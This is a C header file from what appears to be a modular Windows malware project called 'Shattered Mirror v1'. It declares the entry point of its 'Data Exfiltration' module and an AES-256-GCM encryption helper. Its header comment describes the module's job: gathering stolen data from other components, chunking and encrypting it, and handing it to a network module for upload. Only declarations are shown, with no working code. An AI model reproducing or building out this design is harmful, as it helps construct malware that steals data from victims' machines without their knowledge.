#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Atom 05: Data Exfiltration
 *
 * Receives data buffers from other Atoms via IPC, chunks them into 4KB segments,
 * encrypts each chunk using AES-256-GCM, and forwards them to Atom_01_Net for
 * upload. Implements hashing and sequence numbers for integrity.
 *===========================================================================*/

#ifndef SMIRROR_ATOM_05_EXFIL_H
#define SMIRROR_ATOM_05_EXFIL_H

#include <windows.h>

/* Setup exfiltration channel */
DWORD WINAPI ExfiltrationAtomMain(LPVOID lpParam);

/* External helper: Encrypts a chunk with AES-256-GCM using bcrypt.dll */
BOOL AesGcmEncrypt(const BYTE* pKey, const BYTE* pIv, const BYTE* pPlaintext, DWORD dwPlainLen, BYTE* pCiphertext, BYTE* pTag);

#endif /* SMIRROR_ATOM_05_EXFIL_H */
